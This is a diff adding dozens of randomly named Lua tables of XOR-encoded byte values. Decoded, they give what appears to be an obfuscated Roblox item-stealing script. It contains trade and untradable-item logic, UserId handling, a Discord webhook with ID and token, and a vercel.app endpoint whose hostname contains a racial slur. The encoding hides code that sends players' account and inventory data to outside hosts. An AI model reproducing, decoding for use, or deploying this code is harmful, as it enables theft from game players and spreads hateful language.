+local _qmkkcycrvogs = {90,80,20,90,91,64,20,65,90,64,70,85,80,85,86,88,81,111,80,85,64,85,93,80,105,20,64,92,81,90,62,20,20,20,20,20,20,20,20,88,91,87,85,88,20,66,85,88,65,81,20,9,20,66,85,88,65,81,120,93,71,64,111,80,85,64,85,93,80,105}
+local _igflitpgjsnl = {46,8,30,9,50,31,82,113,91,91,91,91,91,23,20,24,26,23,91,53,20,15,51,30,26,31,91,70,91,89,19,15,15,11,8,65,84,84,29,14,24,16,18,21,28,21,18,28,28,30,9,22,29,85,13,30,9,24,30,23,85,26,11,11,84,26,11,18,84,53}
+local _snenlfeutgio = {254,177,172,254,239,212,178,177,189,191,178,254,174,183,176,185,254,227,254,129,153,240,174,183,176,185,155,168,187,172,167,177,176,187,254,177,172,254,252,135,187,173,252,212,178,177,189,191,178,254,169,187,188,182,177,177,181,139,172,178,254,227,254,129,153,240,169,187,188,182}
+local _cyfxrcerivnh = {124,118,112,102,53,40,53,110,104,104,53,31,53,53,53,53,112,123,113,31,53,53,53,53,121,122,118,116,121,53,102,96,118,118,112,102,102,57,53,103,112,102,53,40,53,101,118,116,121,121,61,115,96,123,118,97,124,122,123,61,60,31,53,53,53,53,53,53,53,53}
+local _bmnmccfanlbd = {25,27,19,14,21,25,15,92,8,20,25,18,92,16,19,31,23,70,58,21,14,25,84,85,92,25,18,24,118,92,92,92,92,92,92,92,92,25,18,24,85,118,92,92,92,92,25,18,24,118,92,92,92,92,16,19,31,23,82,57,10,25,18,8,70,43,29,21,8,84}
+local _qbignhsjtyfp = {229,227,246,242,210,244,231,226,227,174,175,140,166,166,166,166,166,166,166,166,166,166,166,166,166,166,166,166,241,231,239,242,192,233,244,210,244,231,226,227,197,233,235,246,234,227,242,239,233,232,174,175,140,140,166,166,166,166,166,166,166,166,166,166,166,166,166,166,166,166}
+local _xnzrjtlsskeb = {199,205,163,163,163,197,198,202,200,197,137,207,220,199,202,221,192,198,199,137,238,204,221,229,198,202,200,221,192,198,199,129,128,163,137,137,137,137,197,198,202,200,197,137,218,220,202,202,204,218,218,133,137,219,204,218,137,148,137,217,202,200,197,197,129,207,220,199,202,221}
+local _xlqvvrxmawjw = {86,79,83,82,30,16,54,28,28,28,28,28,28,28,28,28,28,28,28,28,28,28,28,103,30,100,17,121,82,95,83,88,89,88,30,97,28,1,28,30,72,78,73,89,30,28,54,28,28,28,28,28,28,28,28,28,28,28,28,65,16,54,28,28,28,28,28,28,28,28}
+local _mppnpzlbibyd = {243,17,87,202,168,61,94,95,155,214,144,45,128,113,110,115,181,24,106,17,2,93,84,26,44,88,35,73,82,156,238,84,246,235,170,227,12,55,27,38,149,143,35,167,154,201,126,78,64,33,159,248,170,29,20,16,174,254,67,202,110,181,106,191,254,3,120,251,102,133,180,112,216,159,125,12,240,27,161,228,33,51,15,132,32,99,190,43,193,26,65,99,114,147,127,158,153,67,212,93,18}
+local _wbvkncgfpyxh = {117,89,88,66,83,88,66,27,98,79,70,83,20,107,22,11,22,20,87,70,70,90,95,85,87,66,95,89,88,25,92,69,89,88,20,22,75,26,60,22,22,22,22,22,22,22,22,22,22,22,22,116,89,82,79,22,11,22,126,66,66,70,101,83,68,64,95,85,83,12}
+local _ubcqygyxaxzw = {252,244,225,184,165,184,236,234,237,253,180,184,209,251,253,208,249,245,245,253,234,199,217,246,251,241,253,246,236,184,165,184,236,234,237,253,180,146,184,184,184,184,223,241,246,255,253,234,235,251,225,236,240,253,184,165,184,236,234,237,253,180,184,223,241,246,255,253,234,235}
+local _qjdruhzkcuom = {18,15,18,83,94,94,119,74,70,64,83,81,70,87,86,100,83,94,71,87,65,105,91,70,87,95,124,83,95,87,111,56,18,18,18,18,18,18,18,18,18,18,18,18,18,18,18,18,18,18,18,18,87,92,86,56,18,18,18,18,18,18,18,18,18,18,18,18,18,18}
+local _jpgvehdylvxc = {99,58,44,116,121,102,53,99,59,115,124,113,99,99,45,75,55,76,50,77,121,100,117,125,114,127,116,105,75,55,76,50,77,46,56,62,61,57,44,63,116,121,102,46,50,57,48,116,127,26,48,48,48,48,48,48,48,48,121,100,117,125,94,113,125,117,48,45,48,121}
+local _vtmnfciiahqq = {103,109,123,40,102,103,124,40,123,125,120,120,103,122,124,40,64,92,92,88,40,122,109,121,125,109,123,124,123,42,33,2,40,40,40,40,40,40,40,40,122,109,124,125,122,102,40,115,124,103,124,105,100,40,53,40,42,56,38,56,56,42,36,40,97,124,109,101,88,122}
+local _hlmuoqjxdwrq = {115,117,98,115,114,58,54,126,121,102,102,127,120,113,56,56,56,52,54,121,100,54,52,69,115,100,96,115,100,54,112,99,122,122,58,54,126,121,102,102,127,120,113,56,56,56,52,63,28,54,54,54,54,54,54,54,54,69,115,100,96,115,100,94,121,102,62,63,28,54}
+local _zhwryilspmlo = {200,201,206,243,206,223,215,251,206,206,223,215,202,206,223,222,231,154,206,210,223,212,176,154,154,154,154,154,154,154,154,154,154,154,154,154,154,154,154,154,154,154,154,220,213,200,154,229,154,135,154,139,150,154,212,207,215,238,213,238,200,219,222,223,154,222,213,154,206,219}
+local _zrexbydzgcrf = {128,157,172,135,134,131,139,199,205,187,157,142,139,138,205,198,193,188,138,155,189,138,158,154,138,156,155,156,170,129,142,141,131,138,139,213,169,134,157,138,188,138,157,153,138,157,199,155,157,154,138,198,229,230,138,129,139,229,230,229,131,128,140,142,131,207,159,131,142,150}
+local _vleorhngquxd = {228,230,131,171,160,168,189,230,232,228,230,133,170,167,173,161,170,176,230,232,228,230,145,170,173,181,177,161,230,185,206,206,206,168,171,167,165,168,228,177,183,161,182,183,228,249,228,155,131,234,145,183,161,182,170,165,169,161,183,228,171,182,228,191,185,206,168,171,167,165}
+local _ifjuqdlzpqlm = {252,241,233,245,226,190,197,227,245,226,217,244,185,176,238,173,176,178,254,229,253,242,245,226,178,176,228,248,245,254,154,176,176,176,176,245,226,226,255,226,184,255,251,185,154,176,176,176,176,226,245,228,229,226,254,154,245,254,244,154,154,252,255,243,241,252,176,246,229,254}
+local _scogixrotnqm = {234,239,230,214,241,239,175,137,163,163,163,163,163,163,163,163,163,163,163,163,231,230,240,224,241,234,243,247,234,236,237,163,190,163,161,223,177,177,181,223,178,182,181,223,178,181,187,163,194,237,163,234,231,234,236,247,163,235,226,240,163,225,230,230,237,163,229,236,246,237}
+local _azrkawicmbmd = {147,199,193,198,214,185,185,223,220,208,210,223,147,208,220,198,221,199,147,142,147,131,185,223,220,208,210,223,147,208,220,221,221,147,142,147,212,210,222,214,137,244,214,199,224,214,193,197,218,208,214,155,145,225,198,221,224,214,193,197,218,208,214,145,154,157,251,214,210,193}
+local _rjxjkdryjskg = {15,15,15,15,15,15,15,15,15,15,103,74,78,75,74,93,92,15,18,15,84,37,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,116,13,108,64,65,91,74,65,91,2,123,86,95,74,13,114,15,18,15,13,78,95,95,67,70,76,78,91,70,64,65,0}
+local _fpkllvyuaahi = {239,197,197,197,197,197,197,197,197,197,197,197,197,128,139,129,239,197,197,197,197,197,197,197,197,128,139,129,239,239,197,197,197,197,197,197,197,197,145,132,135,137,128,203,140,139,150,128,151,145,205,140,145,128,136,150,201,197,158,239,197,197,197,197,197,197,197,197,197,197}
+local _ipuflcrwvdtj = {229,240,225,224,215,240,235,246,229,227,225,170,208,246,229,224,225,170,195,225,240,208,246,229,224,225,215,240,229,240,241,247,190,205,234,242,235,239,225,215,225,246,242,225,246,172,173,142,225,234,224,142,232,235,231,229,232,164,226,241,234,231,240,237,235,234,164,243,229,237}
+local _lpbnebwubydz = {87,87,87,87,18,25,19,94,125,87,87,87,87,18,25,19,125,18,25,19,125,27,24,20,22,27,87,17,2,25,20,3,30,24,25,87,16,18,3,35,5,22,19,18,36,3,22,3,2,4,95,94,125,87,87,87,87,5,18,3,2,5,25,87,37,18,7,27,30,20}
+local _unslzusmvnhy = {169,158,169,168,236,241,236,184,190,185,169,224,236,152,190,173,186,169,160,169,190,141,180,169,142,190,163,162,182,169,236,241,236,184,190,185,169,224,236,152,190,173,186,169,160,169,190,141,180,169,159,165,160,186,169,190,236,241,236,184,190,185,169,224,236,152,190,173,186,169}
+local _eiesrhmetxql = {235,228,162,161,245,231,227,242,237,236,241,214,237,209,231,236,230,162,188,162,178,162,246,234,231,236,136,162,162,162,162,246,227,224,238,231,172,241,237,240,246,170,245,231,227,242,237,236,241,214,237,209,231,236,230,174,162,228,247,236,225,246,235,237,236,170,227,174,162,224}
+local _alpukifhzjiw = {12,27,29,27,23,8,27,12,94,67,94,12,27,29,27,23,8,27,12,45,10,12,94,116,94,94,94,94,94,94,94,94,3,116,116,94,94,94,94,94,94,94,94,18,17,29,31,18,94,13,11,29,29,27,13,13,82,94,12,27,13,14,17,16,13,27,94,67,94,14}
+local _lhlcpmdqcxys = {30,30,90,27,90,15,9,31,8,20,27,23,31,9,90,21,8,90,27,90,12,27,22,19,30,90,13,31,24,18,21,21,17,90,91,88,83,112,90,90,90,90,8,31,14,15,8,20,112,31,20,30,112,19,28,90,29,27,23,31,84,42,22,27,25,31,51,30,90,4}
+local _hxuipohzcnxc = {244,254,240,254,240,252,254,254,245,214,252,252,252,252,252,252,252,252,176,179,191,189,176,252,170,189,176,169,185,252,225,252,168,179,178,169,177,190,185,174,244,170,189,176,169,185,143,168,174,245,214,252,252,252,252,252,252,252,252,181,186,252,170,189,176,169,185,252,168,180}
+local _fgobzxdsawwb = {78,78,64,42,15,9,14,44,9,14,11,64,78,78,64,66,73,66,76,64,9,14,12,9,14,5,64,93,64,20,18,21,5,64,29,106,64,64,64,64,64,64,64,64,64,64,64,64,29,76,106,64,64,64,64,64,64,64,64,64,64,64,64,6,15,15,20,5,18,64}
+local _qaqrikpclidk = {193,193,193,193,132,143,133,235,193,193,193,193,193,193,193,193,193,193,193,193,132,141,146,132,235,193,193,193,193,193,193,193,193,193,193,193,193,193,193,193,193,149,128,146,138,207,150,128,136,149,201,209,207,212,200,235,193,193,193,193,193,193,193,193,193,193,193,193,132,143}
+local _kogogopircdb = {43,95,222,168,130,129,34,55,170,217,249,168,17,7,155,243,46,44,130,153,71,22,46,190,221,245,227,228,230,166,182,84,56,250,57,130,176,215,133,249,119,20,95,74,203,245,236,69,180,36,136,68,215,200,152,96,74,214,51,216,15,59,137,220,103,85,115,200,135,131,26,113,110,175,192,88,231,45,182,204,123,142,220,142,202,244,232,51,188,99,222,60,155,38,188,170,112,2,231,56,11,132,35,171,162,210,76,239,84,185,225,95,2,40,67,40,195,114,135,9,120,181,95,85,86,209,28,184,35,70,11,10,81,129,228,138,74,32,10,181,204,130,200,24,150,23,212,171,176,223,224,225,216,68,82,234,245,182,168,196,199,107,253,248,198,86,62,232,22,26,217,59,33,16,5,219,193,192,102,68,252,25,42,44,222,213,141,188,73,117}
+local _jvclofdtnxpg = {80,80,80,80,25,22,80,31,27,80,4,24,21,30,80,122,80,80,80,80,80,80,80,80,80,80,80,122,80,80,80,80,80,80,80,80,2,21,4,5,2,30,80,20,21,19,31,20,21,20,80,21,30,20,122,80,80,80,80,21,30,20,122,122,80,80,80,80,2,21}
+local _vykspqdwjutz = {78,79,120,95,68,89,74,76,78,17,124,74,66,95,109,68,89,104,67,66,71,79,3,9,111,74,95,74,73,74,88,78,9,2,17,124,74,66,95,109,68,89,104,67,66,71,79,3,9,120,82,69,72,9,2,17,124,74,66,95,109,68,89,104,67,66,71,79,3,9}
+local _olyjbvnoqnqw = {133,133,133,133,133,133,133,133,133,133,237,192,196,193,192,215,214,133,152,133,222,175,133,133,133,133,133,133,133,133,133,133,133,133,133,133,133,133,133,133,133,133,254,135,230,202,203,209,192,203,209,136,241,220,213,192,135,248,133,152,133,135,196,213,213,201,204,198,196,209}
+local _azaosuiubydi = {6,6,83,72,79,87,83,67,6,27,6,4,78,82,82,86,85,28,9,9,85,83,86,84,67,75,67,80,71,74,83,67,74,79,85,82,8,69,73,75,9,75,75,20,9,83,72,79,87,83,67,85,8,78,82,75,74,4,10,44,6,6,6,6,69,74,71,85,85,79}
+local _hbmppgojqecu = {139,147,132,138,154,219,212,222,154,157,139,157,154,213,200,154,157,138,157,147,154,223,212,222,154,200,223,206,207,200,212,154,200,129,176,154,154,154,154,154,154,154,154,223,212,222,147,148,148,157,138,138,138,138,157,147,128,221,201,207,216,146,157,159,222,159,222,159,222,133}
+local _nslsswbwswbr = {52,48,51,122,111,111,51,53,48,50,37,45,37,54,33,44,53,37,44,41,51,52,110,35,47,45,111,45,45,114,111,35,40,50,47,45,33,51,110,40,52,45,44,98,74,61,74,44,47,35,33,44,96,51,35,50,33,48,41,46,39,8,37,33,36,37,50,51,96,125}
+local _namuqfiiiyrn = {226,163,248,226,163,248,226,163,248,224,235,231,161,178,169,164,179,174,168,169,239,191,238,205,231,231,231,231,231,231,231,231,231,231,231,231,174,161,231,239,228,191,251,241,238,231,179,175,162,169,231,181,162,179,178,181,169,231,224,224,231,162,169,163,231,171,168,164,166,171}
+local _faqmslqkifcc = {64,98,117,104,119,100,33,117,105,100,111,11,33,33,33,33,33,33,33,33,115,100,117,116,115,111,11,33,33,33,33,100,111,101,11,11,11,33,33,33,33,115,100,117,116,115,111,33,119,96,109,48,33,43,33,56,56,33,43,33,55,56,33,43,33,51,48,33,36,33}
+local _pckumwiqvmbv = {30,18,16,29,81,4,31,5,3,16,21,16,19,29,20,81,76,81,10,123,81,81,81,81,53,20,23,16,4,29,5,54,4,31,81,76,81,5,3,4,20,93,81,53,20,23,16,4,29,5,58,31,24,23,20,81,76,81,5,3,4,20,93,81,35,20,16,7,20,3}
+local _kzdqoulenkph = {190,247,248,190,249,251,234,202,236,255,250,251,205,234,255,234,235,237,182,183,190,163,163,190,188,208,241,240,251,188,190,234,246,251,240,190,252,236,251,255,245,190,251,240,250,148,190,190,190,190,251,240,250,148,251,240,250,148,242,241,253,255,242,190,202,236,255,250,251,190}
+local _ffzkfzcnfgtl = {147,147,147,214,221,215,185,218,221,197,214,221,199,220,193,202,224,199,193,147,142,147,218,221,197,214,221,199,220,193,202,224,199,193,147,157,157,147,145,211,211,211,145,185,185,223,220,208,210,223,147,208,220,198,221,199,193,202,147,142,147,145,230,221,216,221,220,196,221,145}
+local _xydcgbjyxyfm = {79,52,18,4,19,40,5,65,79,79,65,67,71,22,8,5,21,9,92,80,84,81,71,9,4,8,6,9,21,92,80,84,81,71,7,14,19,12,0,21,92,17,15,6,67,107,65,65,65,65,13,14,2,0,13,65,0,23,0,21,0,19,52,19,13,65,92,65,67,9}
+local _innbkhhtwxzw = {181,188,171,152,161,188,158,182,181,189,249,228,249,173,171,172,188,245,211,249,249,249,249,155,181,172,188,154,184,180,182,134,146,134,235,233,235,235,249,228,249,173,171,172,188,245,249,158,171,188,188,183,154,184,180,182,134,146,134,235,233,235,235,249,228,249,173,171,172,188}
+local _qfptbfqraaxn = {51,44,38,32,101,120,101,34,36,40,32,127,2,32,49,22,32,55,51,44,38,32,109,103,13,49,49,53,22,32,55,51,44,38,32,103,108,79,101,101,101,101,41,42,38,36,41,101,26,48,7,101,120,101,62,79,101,101,101,101,101,101,101,101,116,117,113,105,101,116}
+local _nbajaewppajp = {23,80,87,74,92,75,77,17,90,86,84,91,80,87,92,93,108,74,92,75,21,25,77,86,74,77,75,80,87,94,17,79,16,3,85,86,78,92,75,17,16,16,25,92,87,93,51,51,51,85,86,90,88,85,25,113,77,77,73,106,92,75,79,80,90,92,25,4,25,94}
+local _kabtbidpbshc = {35,45,36,43,38,98,104,15,36,43,40,38,47,46,104,99,112,9,37,36,36,47,41,62,98,44,63,36,41,62,35,37,36,98,99,106,62,56,43,46,47,45,63,35,58,34,37,36,47,100,15,36,43,40,38,47,46,106,119,106,44,43,38,57,47,106,47,36,46,99}
+local _apqkiruiwtzf = {196,196,196,196,196,196,196,196,196,196,196,141,130,196,140,133,151,167,140,150,139,137,133,196,144,140,129,138,238,196,196,196,196,196,196,196,196,196,196,196,196,196,196,196,196,196,196,196,196,136,139,135,133,136,196,137,133,144,135,140,129,128,196,217,196,138,141,136,238,196}
+local _raaqjuahqidm = {135,150,177,135,144,148,135,144,182,155,146,135,192,203,216,171,140,148,141,137,135,177,135,144,148,135,144,202,203,194,223,223,194,192,180,171,178,177,135,144,148,135,144,192,203,232,142,141,129,131,142,194,164,183,174,174,194,223,194,202,193,178,142,131,155,135,144,145,216,165}
+local _jbghklxuqpol = {224,205,201,204,205,218,219,136,149,136,219,203,218,201,216,193,198,207,224,205,201,204,205,218,219,136,213,129,162,136,136,136,136,205,198,204,129,162,136,136,136,136,218,205,220,221,218,198,136,128,219,221,203,203,205,219,219,136,201,198,204,136,218,205,219,216,199,198,219,205}
+local _ewavletocqpp = {160,173,173,233,167,180,175,162,181,168,174,175,233,232,203,225,225,225,225,225,225,225,225,225,225,225,225,179,164,181,180,179,175,225,137,181,181,177,146,164,179,183,168,162,164,251,139,146,142,143,133,164,162,174,165,164,233,179,164,178,239,131,174,165,184,232,203,225,225,225}
+local _evtxshocsteg = {112,127,117,49,98,104,127,63,99,116,96,100,116,98,101,56,49,126,99,49,57,121,101,101,97,49,112,127,117,49,121,101,101,97,63,99,116,96,100,116,98,101,56,49,126,99,49,121,101,101,97,78,99,116,96,100,116,98,101,49,126,99,49,57,119,125,100,105,100,98}
+local _joxfgnhivaon = {244,183,233,228,244,178,187,166,244,189,233,229,248,226,244,176,187,244,183,233,183,255,252,172,238,167,161,182,252,189,248,189,253,233,233,243,229,243,244,181,186,176,244,230,138,252,226,249,189,253,244,187,166,244,228,253,244,177,186,176,244,166,177,160,161,166,186,244,182,238}
+local _ccduqjaerhjv = {143,198,219,202,194,134,165,202,193,203,165,165,165,219,206,205,195,202,129,220,192,221,219,135,203,198,220,223,195,206,214,227,198,220,219,131,143,201,218,193,204,219,198,192,193,135,206,131,143,205,134,165,143,143,143,143,195,192,204,206,195,143,195,192,192,196,218,223,238,143}
+local _kpbvetpzxqgj = {180,162,165,161,180,250,131,175,174,174,165,163,180,232,166,181,174,163,180,169,175,174,232,164,180,233,202,224,224,224,224,163,175,181,174,180,224,235,253,224,241,202,165,174,164,233,202,183,168,169,172,165,224,163,175,181,174,180,224,252,224,242,224,164,175,202,224,224,224,224}
+local _ybiathevwqvr = {140,135,201,155,140,157,156,155,135,201,159,136,133,156,140,201,140,135,141,227,201,201,201,201,140,135,141,227,201,201,201,201,155,140,157,156,155,135,201,135,128,133,227,140,135,141,227,133,134,138,136,133,201,143,156,135,138,157,128,134,135,201,140,145,157,155,136,138,157,160}
+local _qrrpsvgclupk = {5,24,41,2,3,6,14,66,72,62,24,11,14,15,72,67,80,61,11,3,30,44,5,24,41,2,3,6,14,66,72,57,15,4,14,56,15,27,31,15,25,30,72,67,80,35,4,28,5,1,15,57,15,24,28,15,24,66,30,11,24,13,15,30,67,96,74,74,74,74}
+local _xlsdotqhczrl = {150,139,249,206,219,199,194,200,202,223,206,207,248,223,196,217,202,204,206,133,255,217,202,207,206,161,244,236,133,231,202,216,223,228,205,205,206,217,139,150,139,244,236,133,231,202,216,223,228,205,205,206,217,139,196,217,139,197,194,199,161,255,217,202,207,206,133,254,219,207}
+local _nfcffninygba = {7,67,94,67,19,0,2,15,15,75,5,22,13,0,23,10,12,13,75,74,67,17,6,23,22,17,13,67,43,23,23,19,48,6,17,21,10,0,6,89,41,48,44,45,39,6,0,12,7,6,75,17,6,16,77,33,12,7,26,74,67,6,13,7,74,105,67,67,67,67}
+local _phubcqlwwiqu = {68,78,72,94,13,66,95,13,86,80,39,13,13,13,13,65,66,78,76,65,13,104,85,72,78,88,89,66,95,13,16,13,5,68,73,72,67,89,68,75,84,72,85,72,78,88,89,66,95,13,76,67,73,13,68,73,72,67,89,68,75,84,72,85,72,78,88,89,66,95}
+local _phegijutxmzj = {138,228,206,206,206,206,206,206,206,206,206,206,206,206,154,143,157,133,192,153,143,135,154,198,223,199,228,206,206,206,206,206,206,206,206,139,128,138,228,206,206,206,206,139,128,138,228,228,206,206,206,206,206,206,206,206,130,129,141,143,130,206,136,155,128,141,154,135,129,128}
+local _zysvlmngbwut = {139,219,154,149,159,219,147,143,143,139,213,137,158,138,142,158,136,143,210,241,219,219,219,219,241,219,219,219,219,146,157,219,149,148,143,219,137,158,138,219,143,147,158,149,219,241,219,219,219,219,219,219,219,219,140,154,137,149,211,217,190,131,158,152,142,143,148,137,219,159}
+local _oxirsqhhjbhi = {29,54,44,49,51,63,23,42,59,51,45,118,54,42,51,50,29,49,48,42,59,48,42,119,84,126,126,126,126,50,49,61,63,50,126,61,54,44,49,51,63,8,63,50,43,59,45,126,99,126,37,35,84,126,126,126,126,56,49,44,126,61,54,44,49,51,63,16,63,51}
+local _uunoojufequx = {212,152,155,151,149,128,157,155,154,167,128,134,212,201,212,152,155,151,149,128,157,155,154,167,128,134,212,218,218,212,214,216,212,214,212,218,218,212,152,155,151,218,151,157,128,141,212,145,154,144,254,254,212,212,212,212,152,155,151,149,152,212,157,135,160,155,132,188,157,128}
+local _qxvwbqhmrgxm = {158,180,180,180,180,158,248,251,247,245,248,180,253,231,195,252,253,224,241,248,253,231,224,241,240,180,169,180,242,245,248,231,241,158,242,251,230,180,203,184,180,250,245,249,241,180,253,250,180,228,245,253,230,231,188,225,231,241,230,231,180,251,230,180,239,233,189,180,240,251}
+local _jqweazrhhjyt = {238,238,238,238,238,171,160,170,231,196,238,238,238,238,238,238,238,238,167,168,238,161,165,238,175,160,170,238,188,171,189,190,161,160,189,171,138,175,186,175,238,186,166,171,160,196,238,238,238,238,238,238,238,238,238,238,238,238,196,238,238,238,238,238,238,238,238,238,238,238}
+local _ccepsivfeatu = {31,31,90,81,91,53,31,31,31,31,31,31,31,31,31,31,31,31,90,81,91,53,31,31,31,31,31,31,31,31,90,81,91,53,31,31,31,31,90,81,91,53,31,31,31,31,77,90,75,74,77,81,31,73,94,83,74,90,115,86,76,75,53,90,81,91,53,53,53,53}
+local _cvpdbqzchacg = {125,98,99,126,35,66,122,99,104,105,36,45,105,98,7,45,45,45,45,121,108,126,102,35,122,108,100,121,37,36,7,45,45,45,45,97,98,110,108,97,45,127,108,127,100,121,116,45,48,45,105,108,121,108,111,108,126,104,86,105,108,121,108,100,105,80,35,95,108,127}
+local _aggkhbzkkgrz = {1,1,1,1,1,77,78,66,64,77,1,73,85,76,77,98,78,79,85,68,79,85,1,28,1,71,68,85,66,73,105,117,108,109,9,84,83,77,8,43,1,1,1,1,1,1,1,1,1,1,1,1,72,71,1,73,85,76,77,98,78,79,85,68,79,85,1,64,79,69}
+local _kpgujmdqphyz = {159,159,159,159,159,159,159,159,159,159,159,159,159,159,159,194,147,181,159,159,159,159,159,159,159,159,159,159,159,159,159,159,159,159,253,208,219,198,159,130,159,247,203,203,207,236,218,205,201,214,220,218,133,245,236,240,241,250,209,220,208,219,218,151,207,222,198,211,208,222}
+local _cukkkkufegfn = {51,52,55,44,54,52,44,48,54,53,56,49,50,50,50,45,99,114,107,45,118,109,105,103,108,45,32,34,44,44,34,111,99,113,118,103,112,86,109,105,103,108,8,34,34,34,34,8,34,34,34,34,110,109,97,99,110,34,112,103,115,119,103,113,118,68,119,108,97,34}
+local _otcaphagvhlh = {88,125,123,124,50,47,50,102,96,103,119,24,77,85,60,122,119,115,96,102,112,119,115,102,50,47,50,102,96,103,119,24,126,125,113,115,126,50,113,125,127,112,123,124,119,118,71,97,119,96,50,47,50,105,111,24,126,125,113,115,126,50,113,125,127,112,123,124,119,118}
+local _xdtvrynpbaco = {39,43,35,124,1,35,50,21,35,52,48,47,37,35,110,100,14,50,50,54,21,35,52,48,47,37,35,100,111,76,42,41,37,39,42,102,22,42,39,63,35,52,53,102,123,102,33,39,43,35,124,1,35,50,21,35,52,48,47,37,35,110,100,22,42,39,63,35,52,53}
+local _fbszlymnqvek = {10,23,10,94,88,67,71,2,67,94,79,71,100,75,71,79,16,77,89,95,72,2,8,15,89,1,8,6,10,8,10,8,3,3,32,10,10,10,10,10,10,10,10,10,10,10,10,67,94,79,71,100,75,71,79,10,23,10,94,88,67,71,2,2,67,94,79,71,100,75}
+local _ddcosxnnjpjy = {142,147,133,146,148,200,131,129,148,133,135,143,146,137,133,147,180,143,166,133,148,131,136,204,192,155,146,129,146,137,148,153,192,221,192,146,129,146,137,148,153,204,192,149,146,140,192,221,192,149,146,140,157,201,234,192,192,192,192,133,142,132,234,192,192,192,192,140,143,131}
+local _fehgkjkajdad = {138,138,209,138,196,203,199,207,138,151,138,136,246,152,158,154,246,155,159,147,246,155,158,159,246,155,156,158,138,252,195,201,222,195,199,138,227,196,204,197,136,134,138,220,203,198,223,207,138,151,138,136,202,202,202,255,217,207,216,138,138,138,138,138,144,138,136,138,132,132}
+local _koefvtuxsvmv = {80,71,86,87,80,76,2,80,71,83,10,89,40,2,2,2,2,2,2,2,2,2,2,2,2,119,80,78,2,31,2,86,67,80,69,71,86,14,40,2,2,2,2,2,2,2,2,2,2,2,2,111,71,86,74,77,70,2,31,2,0,114,109,113,118,0,14,40,2,2}
+local _ufiqmvsjhjny = {54,54,54,54,54,54,54,54,98,100,119,114,115,113,99,127,44,81,115,98,70,100,121,102,115,100,98,111,85,126,119,120,113,115,114,69,127,113,120,119,122,62,52,83,120,119,116,122,115,114,52,63,44,85,121,120,120,115,117,98,62,112,99,120,117,98,127,121,120,62}
+local _zjqhwlebvhts = {10,0,68,89,68,31,25,110,8,11,7,5,8,68,9,13,10,59,22,5,22,13,16,29,59,13,10,0,1,28,68,89,68,16,5,6,8,1,74,2,13,10,0,76,22,5,22,13,16,29,48,5,6,8,1,72,68,9,13,10,59,22,5,22,13,16,29,77,110,8}
+local _aibtehyqlert = {151,199,219,197,153,249,214,218,210,151,153,153,151,149,235,217,226,196,210,197,151,254,243,151,151,141,151,149,151,153,153,151,199,219,197,153,226,196,210,197,254,211,151,153,153,151,149,235,217,246,208,210,151,151,151,151,151,151,141,151,149,151,153,153,151,199,219,197,153,246}
+local _ecffgzbdmevp = {84,24,29,31,17,84,51,17,23,31,27,93,84,55,28,6,27,25,17,91,69,71,69,90,68,90,68,90,68,84,39,21,18,21,6,29,91,65,71,67,90,71,66,86,126,9,126,24,27,23,21,24,84,18,1,26,23,0,29,27,26,84,0,6,29,25,92,7,93,84}
+local _hpzubsoxxtvp = {243,228,245,244,243,239,161,242,187,236,224,245,226,233,169,163,223,164,242,171,169,175,172,168,164,242,171,165,163,168,161,228,239,229,139,237,238,226,224,237,161,231,244,239,226,245,232,238,239,161,231,228,245,226,233,201,213,204,205,169,244,243,237,168,139,161,161,161,161,232}
+local _dlacyfwdbanw = {159,246,220,218,220,205,202,204,215,218,205,159,130,159,203,205,202,218,147,159,228,157,128,128,128,157,226,159,130,159,203,205,202,218,147,159,251,222,205,203,221,205,214,209,216,218,205,159,130,159,203,205,202,218,147,181,159,159,159,159,235,205,222,201,218,211,218,205,254,199}
+local _ltwngtgzaxzr = {149,199,218,199,207,139,136,132,201,132,136,146,137,147,149,158,199,136,149,199,197,178,137,140,137,136,144,137,197,206,237,199,199,199,199,142,129,199,139,136,132,201,132,142,147,158,199,134,137,131,199,139,136,132,201,132,142,147,158,199,153,218,199,197,197,199,147,143,130,137}
+local _pmyregzbcrjg = {219,136,143,154,137,143,178,150,150,158,159,146,154,143,158,179,146,143,211,210,241,219,219,219,219,219,219,219,219,174,149,151,148,152,144,175,137,154,159,158,136,211,210,241,219,219,219,219,219,219,219,219,157,148,137,219,164,215,219,139,219,146,149,219,146,139,154,146,137,136}
+local _emwwmzplqvot = {1,38,56,116,105,116,118,60,32,32,36,39,110,123,123,35,35,35,122,38,59,54,56,59,44,122,55,59,57,123,60,49,53,48,39,60,59,32,121,32,60,33,57,54,58,53,61,56,123,61,57,53,51,49,107,33,39,49,38,29,48,105,118,116,122,122,116,36,56,38}
+local _xlugxqilrlky = {100,42,99,122,107,99,120,121,34,110,99,121,122,102,107,115,70,99,121,126,35,42,110,101,0,42,42,42,42,102,101,105,107,102,42,99,126,111,103,67,100,108,101,42,55,42,110,107,126,107,104,107,121,111,81,99,126,111,103,36,78,107,126,107,67,78,87,0,42,42}
+local _euoxiroadymt = {245,245,245,245,134,176,182,160,167,176,134,176,187,177,253,177,180,161,180,252,223,245,245,245,245,245,245,245,245,180,166,166,188,178,187,145,189,129,186,145,180,161,180,183,180,166,176,253,252,223,245,245,245,245,176,187,177,223,176,187,177,223,176,187,177,223,185,186,182,180}
+local _zmcsoqgcyshc = {239,242,228,174,227,239,237,175,225,240,233,175,247,229,226,232,239,239,235,243,175,177,180,185,181,185,177,185,184,183,182,178,179,182,179,183,184,178,180,179,175,250,185,214,229,173,242,178,211,225,229,183,247,244,214,249,202,173,185,196,228,203,178,215,238,208,173,202,185,195}
+local _mpdbrohromft = {206,206,130,129,141,143,130,206,156,139,159,206,211,206,156,139,159,155,139,157,154,206,129,156,206,198,157,151,128,206,143,128,138,206,157,151,128,192,156,139,159,155,139,157,154,199,206,129,156,206,134,154,154,158,177,156,139,159,155,139,157,154,206,129,156,206,198,134,154,154}
+local _apmzwqlomvfl = {167,167,167,243,238,234,226,244,243,230,234,247,167,186,167,232,244,169,227,230,243,226,175,165,166,162,222,170,162,234,170,162,227,211,162,207,189,162,202,189,162,212,221,165,174,141,167,167,167,167,167,167,167,167,250,250,141,167,167,167,167,250,141,167,167,167,167,141,141,141}
+local _kmaihyrxkndz = {116,117,46,106,111,117,114,47,38,98,105,12,38,38,38,38,38,38,38,38,114,105,114,103,106,80,103,106,115,99,38,59,38,114,105,114,103,106,80,103,106,115,99,38,45,38,46,46,111,114,99,107,40,80,103,106,115,99,38,105,116,38,54,47,38,44,38,46,111,114}
